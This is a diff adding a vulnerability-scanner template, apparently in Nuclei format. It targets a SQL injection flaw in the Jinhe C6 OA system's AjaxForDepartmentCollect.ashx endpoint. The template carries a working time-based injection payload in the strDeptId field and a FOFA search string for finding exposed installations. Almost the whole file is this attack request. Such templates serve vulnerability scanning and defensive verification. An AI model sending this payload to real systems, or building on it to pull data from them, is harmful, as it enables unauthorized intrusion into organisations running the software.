@@ -1,0 +1,26 @@
+id: poc-af06yylxh6tsxb0l
+info:
+  name: 金和OAC6 AjaxForDepartmentCollect存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/af06yylxh6tsxb0l'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: af06yylxh6tsxb0l
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    strType=getHistoryList&strDeptId=1;waitfor+delay+''0:0:5''--+&strCollectType=Department&strYear=2012'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
